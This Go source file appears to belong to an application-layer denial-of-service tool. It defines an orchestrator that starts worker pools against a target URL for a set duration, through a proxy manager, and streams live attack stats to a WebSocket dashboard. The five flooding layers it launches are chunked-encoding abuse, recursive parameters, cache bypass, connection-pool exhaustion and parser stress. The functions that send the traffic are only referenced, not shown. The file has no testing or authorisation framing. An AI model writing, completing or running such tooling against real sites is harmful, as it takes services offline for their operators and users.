package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
  "encoding/json"
	"log"
	"net/url"
	"sync"
	"time"
)

// Orchestrator manages the entire multi-layer attack lifecycle.
type Orchestrator struct {
	id        string
	target    *url.URL
	layers    LayerWorkers
	duration  time.Duration
	proxyMgr  *ProxyManager
	hub       *WebSocketHub
	cfg       *Config

	stats  *Stats
	ctx    context.Context
	cancel context.CancelFunc
	wg     sync.WaitGroup

	mu       sync.Mutex
	running  bool
}

// NewOrchestrator creates a new attack orchestrator.
func NewOrchestrator(
	target *url.URL,
	layers LayerWorkers,
	duration time.Duration,
	proxyMgr *ProxyManager,
	hub *WebSocketHub,
	cfg *Config,
) *Orchestrator {
	ctx, cancel := context.WithCancel(context.Background())
	id := generateID()

	return &Orchestrator{
		id:       id,
		target:   target,
		layers:   layers,
		duration: duration,
		proxyMgr: proxyMgr,
		hub:      hub,
		cfg:      cfg,
		stats:    NewStats(),
		ctx:      ctx,
		cancel:   cancel,
	}
}

// ID returns the unique attack identifier.
func (o *Orchestrator) ID() string { return o.id }

// Target returns the target URL string.
func (o *Orchestrator) Target() string { return o.target.String() }

// UptimeMs returns milliseconds since the attack started.
func (o *Orchestrator) UptimeMs() int64 {
	o.mu.Lock()
	defer o.mu.Unlock()
	if !o.running {
		return 0
	}
	return time.Since(o.stats.StartTime).Milliseconds()
}

// StatsSnapshot returns a point-in-time snapshot of stats.
func (o *Orchestrator) StatsSnapshot() StatsSnapshot {
	return o.stats.Snapshot()
}

// Start begins the multi-layer attack.
func (o *Orchestrator) Start() {
	o.mu.Lock()
	if o.running {
		o.mu.Unlock()
		return
	}
	o.running = true
	o.stats.StartTime = time.Now()
	o.mu.Unlock()

	log.Printf("[orch] Attack %s starting against %s", o.id, o.target.String())
	o.hub.BroadcastLog("success", "Attack started: "+o.id)
	o.hub.BroadcastLog("info", "Target: "+o.target.String())

	// Start stats reporter goroutine
	o.wg.Add(1)
	go o.statsReporter()

	// Create a timer for the overall duration
	var timer <-chan time.Time
	if o.duration > 0 {
		timer = time.After(o.duration)
	}

	// Launch all layers
	o.wg.Add(1)
	go o.launchLayer("L1 - Chunked Abuse", o.layers.L1, layer1Chunked, timer)
	o.wg.Add(1)
	go o.launchLayer("L2 - Recursive Params", o.layers.L2, layer2Recursive, timer)
	o.wg.Add(1)
	go o.launchLayer("L3 - Cache Bypass", o.layers.L3, layer3CacheBypass, timer)
	o.wg.Add(1)
	go o.launchLayer("L4 - Connection Pool", o.layers.L4, layer4PoolExhaust, timer)
	o.wg.Add(1)
	go o.launchLayer("L5 - Parser Stress", o.layers.L5, layer5ParserStress, timer)

	// Wait for all layers to finish
	o.wg.Wait()

	o.mu.Lock()
	o.running = false
	o.mu.Unlock()

	log.Printf("[orch] Attack %s finished", o.id)
}

// Stop gracefully terminates the attack.
func (o *Orchestrator) Stop() {
	o.mu.Lock()
	defer o.mu.Unlock()
	if !o.running {
		return
	}
	o.cancel()
	o.running = false
	o.hub.BroadcastLog("warn", "Attack stopped by user")
	log.Printf("[orch] Attack %s cancelled", o.id)
}

// launchLayer starts a single attack layer with a worker pool.
func (o *Orchestrator) launchLayer(
	name string,
	workerCount int,
	workerFn func(context.Context, *Orchestrator, int) error,
	timer <-chan time.Time,
) {
	defer o.wg.Done()

	// Create a semaphore channel to limit concurrency
	sem := make(chan struct{}, workerCount)
	layerCtx, layerCancel := context.WithCancel(o.ctx)
	defer layerCancel()

	// If timer fires, cancel this layer
	go func() {
		if timer != nil {
			<-timer
			layerCancel()
		}
	}()

	o.hub.BroadcastLog("info", name+": Launching "+intToStr(workerCount)+" workers")

	for i := 0; i < workerCount; i++ {
		select {
		case <-layerCtx.Done():
			return
		case sem <- struct{}{}:
		}

		o.wg.Add(1)
		go func(workerID int) {
			defer o.wg.Done()
			defer func() { <-sem }()

			o.stats.ActiveWorkers.Add(1)
			// Update per-layer active count
			layerIdx := getLayerIndex(name)
			if layerIdx >= 0 && layerIdx < 5 {
				o.stats.Layers[layerIdx].ActiveWorkers.Add(1)
			}

			defer func() {
				o.stats.ActiveWorkers.Add(-1)
				if layerIdx >= 0 && layerIdx < 5 {
					o.stats.Layers[layerIdx].ActiveWorkers.Add(-1)
				}
			}()

			err := workerFn(layerCtx, o, workerID)
			if err != nil && err != context.Canceled && err != context.DeadlineExceeded {
				log.Printf("[%s] Worker %d error: %v", name, workerID, err)
			}
		}(i)
	}

	// Wait for context cancellation
	<-layerCtx.Done()
	o.hub.BroadcastLog("info", name+": Layer stopped")
}

// statsReporter broadcasts stats to the WebSocket hub every 500ms.
func (o *Orchestrator) statsReporter() {
	defer o.wg.Done()
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-o.ctx.Done():
			return
		case <-ticker.C:
			snapshot := o.stats.Snapshot()
			data, err := json.Marshal(snapshot)
			if err != nil {
				continue
			}
			o.hub.Broadcast(data)
		}
	}
}

func generateID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func getLayerIndex(name string) int {
	switch {
	case len(name) >= 2 && name[:2] == "L1":
		return 0
	case len(name) >= 2 && name[:2] == "L2":
		return 1
	case len(name) >= 2 && name[:2] == "L3":
		return 2
	case len(name) >= 2 && name[:2] == "L4":
		return 3
	case len(name) >= 2 && name[:2] == "L5":
		return 4
	}
	return -1
}
